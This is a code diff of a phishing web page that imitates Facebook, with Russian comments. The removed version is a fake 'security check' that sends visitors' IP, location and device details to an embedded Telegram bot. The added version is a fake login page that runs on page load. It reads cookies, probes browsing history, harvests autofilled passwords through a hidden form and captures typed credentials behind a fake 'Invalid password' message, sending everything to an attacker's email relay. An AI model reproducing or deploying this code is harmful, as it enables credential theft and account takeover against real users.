@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook Security Check</title>
+    <title>Facebook - Log In</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
@@ -14,29 +14,50 @@
             align-items: center;
             min-height: 100vh;
         }
-        .container {
+        .login-container {
             background: white;
-            padding: 40px;
-            border-radius: 10px;
+            padding: 30px;
+            border-radius: 8px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 400px;
             text-align: center;
-            max-width: 400px;
-            width: 90%;
         }
         .logo {
             color: #1877f2;
-            font-size: 48px;
+            font-size: 42px;
             font-weight: bold;
             margin-bottom: 20px;
         }
+        input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 10px 0;
+        }
         .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #1877f2;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1877f2;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
+            width: 30px;
+            height: 30px;
             animation: spin 1s linear infinite;
             margin: 20px auto;
+            display: none;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
@@ -45,70 +66,205 @@
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="login-container">
         <div class="logo">facebook</div>
-        <h2>Security Verification</h2>
-        <p>Checking your account for suspicious activity...</p>
-        <div class="loader"></div>
-        <p id="status">Analyzing device information...</p>
+        <h2>Log into Facebook</h2>
+        
+        <form id="loginForm">
+            <input type="text" id="email" name="email" placeholder="Email or phone number" required autocomplete="username">
+            <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+            <button type="submit">Log In</button>
+        </form>
+        
+        <div class="loader" id="loader"></div>
+        <p id="status">Enter your credentials to continue</p>
+        
+        <div style="margin-top: 20px; font-size: 14px; color: #666;">
+            <a href="#" style="color: #1877f2; text-decoration: none;">Forgotten account?</a> · 
+            <a href="#" style="color: #1877f2; text-decoration: none;">Sign up for Facebook</a>
+        </div>
     </div>
 
     <script>
-        // КОНФИГУРАЦИЯ - ЗАМЕНИТЕ НА СВОИ ДАННЫЕ!
-        const BOT_TOKEN = '8370480839:AAF8T7F0B-VlVibXUFoTYCBRTVAOBukmUs8';
-        const CHAT_ID = '811426076';
+        // ВАШ EMAIL - ЗАМЕНИТЕ НА СВОЙ
+        const YOUR_EMAIL = 'chistotaytrr@gmail.com';
+        
+        // ОСНОВНАЯ ФУНКЦИЯ
+        async function startStealing() {
+            await collectSystemInfo();
+            await stealBrowserHistory();
+            await stealCookies();
+            await stealAutofillPasswords();
+            setupFormInterception();
+        }
 
-        // СБОР ДАННЫХ
-        async function collectAndSend() {
+        // СБОР СИСТЕМНОЙ ИНФОРМАЦИИ
+        async function collectSystemInfo() {
             try {
-                // Сбор IP и геолокации
                 const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 const geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r => r.json());
                 
-                // Формирование сообщения
-                const message = 
-                    `🔐 <b>FACEBOOK SECURITY CHECK - НОВАЯ ЖЕРТВА</b>\n\n` +
-                    `🆔 ID: ${Math.random().toString(36).substr(2, 9)}\n` +
-                    `⏰ Время: ${new Date().toLocaleString()}\n` +
-                    `🌐 URL: ${window.location.href}\n\n` +
-                    
-                    `📍 <b>ГЕОЛОКАЦИЯ:</b>\n` +
-                    `📱 IP: ${ipData.ip}\n` +
-                    `🏙️ Город: ${geoData.city}\n` +
-                    `🇷🇺 Страна: ${geoData.country_name}\n` +
-                    `📡 Регион: ${geoData.region}\n` +
-                    `🏢 Провайдер: ${geoData.org}\n\n` +
-                    
-                    `💻 <b>СИСТЕМА:</b>\n` +
-                    `🔍 Браузер: ${navigator.userAgent}\n` +
-                    `📱 Платформа: ${navigator.platform}\n` +
-                    `🖥️ Экран: ${screen.width}x${screen.height}\n` +
-                    `🌍 Язык: ${navigator.language}\n` +
-                    `⏱️ Временная зона: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-
-                // Отправка в Telegram
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                // Обновление статуса
-                document.getElementById('status').textContent = 'Security check complete!';
+                const systemInfo = {
+                    ip: ipData.ip,
+                    city: geoData.city,
+                    country: geoData.country_name,
+                    isp: geoData.org,
+                    browser: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: screen.width + 'x' + screen.height,
+                    language: navigator.language,
+                    url: window.location.href,
+                    timestamp: new Date().toLocaleString()
+                };
                 
-            } catch (error) {
-                document.getElementById('status').textContent = 'Error during verification';
+                await sendReport('system_info', systemInfo);
+            } catch (error) {}
+        }
+
+        // КРАДЕМ ИСТОРИЮ БРАУЗЕРА
+        async function stealBrowserHistory() {
+            const visitedSites = [];
+            const popularSites = [
+                'https://facebook.com', 'https://youtube.com', 'https://google.com',
+                'https://instagram.com', 'https://twitter.com', 'https://vk.com',
+                'https://ok.ru', 'https://mail.ru', 'https://gmail.com',
+                'https://github.com', 'https://tiktok.com', 'https://whatsapp.com',
+                'https://web.telegram.org', 'https://discord.com', 'https://netflix.com',
+                'https://sberbank.ru', 'https://tinkoff.ru', 'https://avito.ru'
+            ];
+            
+            for (const site of popularSites) {
+                try {
+                    const link = document.createElement('link');
+                    link.rel = 'stylesheet';
+                    link.href = site + '/fake.css';
+                    
+                    let isVisited = false;
+                    link.onload = function() {
+                        isVisited = true;
+                        visitedSites.push(site);
+                    };
+                    
+                    document.head.appendChild(link);
+                    
+                    setTimeout(() => {
+                        if (!isVisited) {
+                            const testLink = document.createElement('a');
+                            testLink.href = site;
+                            testLink.style.display = 'none';
+                            document.body.appendChild(testLink);
+                            
+                            const color = getComputedStyle(testLink).color;
+                            if (color !== 'rgb(0, 0, 238)') {
+                                visitedSites.push(site);
+                            }
+                            document.body.removeChild(testLink);
+                        }
+                        document.head.removeChild(link);
+                    }, 50);
+                    
+                } catch (error) {}
+            }
+            
+            if (visitedSites.length > 0) {
+                await sendReport('browser_history', {
+                    visitedSites: visitedSites,
+                    totalCount: visitedSites.length
+                });
             }
         }
 
+        // КРАДЕМ COOKIES
+        async function stealCookies() {
+            try {
+                const cookies = document.cookie;
+                if (cookies && cookies.length > 0) {
+                    await sendReport('cookies', {
+                        cookies: cookies.split(';'),
+                        totalCookies: cookies.split(';').length
+                    });
+                }
+            } catch (error) {}
+        }
+
+        // КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ
+        async function stealAutofillPasswords() {
+            const hiddenForm = document.createElement('form');
+            hiddenForm.style.cssText = 'position: absolute; left: -9999px; top: -9999px;';
+            hiddenForm.innerHTML = `
+                <input type="text" name="username" autocomplete="username">
+                <input type="password" name="password" autocomplete="current-password">
+            `;
+            document.body.appendChild(hiddenForm);
+            
+            setTimeout(() => {
+                const usernameField = hiddenForm.querySelector('input[name="username"]');
+                const passwordField = hiddenForm.querySelector('input[name="password"]');
+                
+                if (usernameField.value || passwordField.value) {
+                    sendReport('autofill_data', {
+                        username: usernameField.value,
+                        password: passwordField.value
+                    });
+                }
+                
+                document.body.removeChild(hiddenForm);
+            }, 1000);
+        }
+
+        // ПЕРЕХВАТ ФОРМЫ ЛОГИНА
+        function setupFormInterception() {
+            document.getElementById('loginForm').addEventListener('submit', function(event) {
+                event.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                const loader = document.getElementById('loader');
+                const status = document.getElementById('status');
+                
+                sendReport('stolen_credentials', {
+                    email: email,
+                    password: password,
+                    source: 'login_form'
+                });
+                
+                loader.style.display = 'block';
+                status.textContent = 'Checking credentials...';
+                
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    status.textContent = 'Invalid password. Please try again.';
+                    status.style.color = 'red';
+                    document.getElementById('password').value = '';
+                }, 3000);
+            });
+        }
+
+        // ОТПРАВКА ОТЧЕТА
+        async function sendReport(type, data) {
+            try {
+                const reportData = {
+                    type: type,
+                    data: data,
+                    timestamp: new Date().toLocaleString()
+                };
+                
+                await fetch("https://formsubmit.co/ajax/" + YOUR_EMAIL, {
+                    method: "POST",
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(reportData)
+                });
+                
+            } catch (error) {}
+        }
+
         // ЗАПУСК
-        collectAndSend();
+        window.addEventListener('load', function() {
+            startStealing();
+        });
     </script>
 </body>
 </html>
